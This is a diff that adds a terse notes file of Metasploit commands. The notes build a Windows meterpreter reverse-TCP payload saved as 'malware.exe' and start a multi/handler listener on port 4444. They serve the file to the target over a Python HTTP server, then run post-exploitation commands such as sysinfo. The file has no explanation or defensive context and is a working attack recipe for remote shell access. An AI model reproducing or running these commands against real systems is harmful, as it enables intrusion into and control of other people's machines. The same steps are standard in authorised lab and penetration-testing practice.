@@ -1,0 +1,19 @@
+ping ip
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali-ip LPORT=4444 -f exe -o malware.exe
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=kali-ip LPORT=4444 -f exe > malware.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST kali-ip
+set LPORT 4444
+exploit
+
+
+
+python3 -m http.server 9090
+kali-ip:9090
+
+
+ls
+sysinfo
